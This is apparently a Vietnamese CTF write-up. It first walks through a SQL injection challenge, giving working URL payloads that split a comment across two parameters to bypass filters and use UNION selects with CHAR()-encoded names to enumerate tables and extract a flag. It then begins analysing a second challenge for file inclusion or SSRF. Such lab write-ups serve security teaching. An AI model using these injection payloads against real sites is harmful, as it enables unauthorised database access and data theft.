# Sqli v1

Đầu tiên ta có source code như sau :

![image](https://user-images.githubusercontent.com/57553555/161921922-f2f34a92-a905-4135-a102-2bdb77afe507.png)

## Phân tích 
- Ta nhận 2 đầu vào `amount` và `name` =>Tham số url `?amount=10000&name=tivi`
- Nó được gán vào 2 biến và được lọc bởi hàm `preg_match` 
- `amount` lọc tất cả các chữ cái , lọc `'` và `"`
- `name` lọc tất cả các kí tự như ```" , ',| ,` ```
- Câu lệnh truy vấn với
```php
$query = "select * from products where amount=".$amount." and name=\"".$name."\"";
echo $query;
=> select * from products where amount=10000 and name="tivi" 
```

## Kiểm tra lỗi
- Đầu tiên ta test tham số amount trước do nó là số nên không cần bypass `"` => Ta test thử payload 
```url
?amount=-1|| 1=1-- -&name=tivi
```
 
![image](https://user-images.githubusercontent.com/57553555/161927184-d14873a5-3678-4c45-aece-45b6c8c70cd1.png)

=> Bài này có lỗi sqli => Nhưng ở đây có vẻ không có flag => Ta phải tìm nó ở chỗ khác rồi

- Tiếp theo ta kiểm tra thử tham số name => Ta phải tìm cách bypass `"` nhằm thoát khỏi chuỗi và thực thi câu lệnh => Ta liên tưởng đến 1 cách là dùng `\`

![image](https://user-images.githubusercontent.com/57553555/161928329-2a166f52-4abf-465b-b834-0e40aa4a79f1.png)

=> Nhưng tham số amount không có `"` rồi @@ mà nó cũng filter mất `"` có thể dùng rồi => Fail ~~~~~~

![image](https://user-images.githubusercontent.com/57553555/161931471-a3e4d7e1-ffd8-4c74-95cb-3bcddc332715.png)

`/vuln.php?id=1 union/*&sort=*/select pass from users– – ` 

- Sau 1 hồi tìm kiếm khá lâu 1 phát hiện siu to đã xuất hiện =>Từ ví dụ trên nếu tham số `id` lọc select và tham số `sort` lọc union => thì khi ta tách truy vấn ra làm 2 => 1 bỏ vào id 1 bỏ vào sort và comment lại đầu vào của tham số trên url `&sort` => ta sẽ được 1 query hoàn chỉnh mà không hề bị lọc

- Áp dụng vào bài của mình => Payload => Thành công
```url
?amount=-1/*&name=*/ or 1=1-- -
```
![image](https://user-images.githubusercontent.com/57553555/161934394-5376c895-9aeb-4b25-8d1e-b5be6e45d61a.png)

![image](https://user-images.githubusercontent.com/57553555/161934728-47c8fc84-f8df-490e-b5ca-5c6c6e325e4c.png)

- Tiếp theo đó ta tìm `database()` => Database : `sqlinjection`
```url
?amount=-1/*&name=*/ union select 1,database(),3-- -
```
![image](https://user-images.githubusercontent.com/57553555/161934904-3645b836-6421-4f8f-92c2-c99331b0b2a2.png)

- Tên table_name => Vì `'` bị lọc nên ta chuyển tên database thành mã ascii  => Table_name : `flagtableahihihoho`
```url
?amount=-1/*&name=*/%20UNION%20select%201,TABLE_NAME,TABLE_SCHEMA%20from%20INFORMATION_SCHEMA.TABLES%20where%20table_schema=CHAR(115,113,108,105,110,106,101,99,116,105,111,110)--%20-
```
![image](https://user-images.githubusercontent.com/57553555/161935680-25fc5355-3d6f-4767-8a05-f7e621d013e1.png)


- Tên column_name => Column_name : `flag`
```url
?
amount=-1/*&name=*/%20UNION%20select%201,CONCAT(COLUMN_NAME),TABLE_NAME%20from%20INFORMATION_SCHEMA.COLUMNS%20where%20table_name=CHAR(102,108,97,103,116,97,98,108,101,97,104,105,104,105,104,111,104,111)--%20-
```
![image](https://user-images.githubusercontent.com/57553555/161936184-3463d04c-d291-4e2d-a59a-e4660096d81b.png)


-Và cuối cùng là flag 
```url
?amount=11 /*&name=*/ UNION select 1,flag,3 from flagtableahihihoho-- -sqlinjection.flagtableahihihoho
```
![image](https://user-images.githubusercontent.com/57553555/161936432-814665c2-362a-40f9-98b4-2803e9b5d186.png)

=> KCSC{flag_for_testing}



# child_orange 

Đầu tiên ta có source code :
![image](https://user-images.githubusercontent.com/57553555/162471087-15884ea2-f251-47a8-bd93-5a5c17857f8e.png)

## Phân tích :
- Đầu vào là tham số `/?url=` => và sau đó gán vào biến $url
- Do mình đọc hàm parse_url chưa ổn lắm nên đã var_dump() nó ra để xem (hàm mới thêm để debug code)
- Đầu tiên biến url được lọc bởi hàm filter_var() => Hàm sẽ kiểm tra url có hợp lệ hay không => Nếu không hợp lệ => Invalid url
- Tiếp theo $url sẽ được kiểm tra nếu trong biến url không có `http:` và `nhienit.kma:2010` => Invalid server
- Tiếp đến nó sẽ lọc 1 số các kí tự đặc biệt => Nếu trong biến url có thì => you are not orange 
- Sau đó nó lại kiểm tra xem khi hàm `parse_url` phân tích cú pháp url thì => host có khác `nhienit.kma` không hoặc port có khác `2010` không => Nếu khác thì => invalid host or port => Nếu giống thì tiếp lục lọc 2 tham số đầu vào là `user & pass` 
- Và cuối cùng nó sẽ chạy vào hàm include và thi hành biến $url 

=> Từ phân tích ta thấy được tham số url đầu vào sẽ bị lọc rất nhìu và yêu cầu bắt buộc host nhienit.kma và port 2010 => Có khi nào để tránh mình dùng localhost để khai thác SSRF không ta 
=> Và ở cuối ta để ý rằng sau khi kiểm tra hoàn tất thì nó sẽ đc thi hành bởi hàm include => Đây cũng là 1 dấu hiệu cho lỗ hổng file include + với trong file source code ta thấy thêm 1 file .htaccess => `php_flag allow_url_include on` 









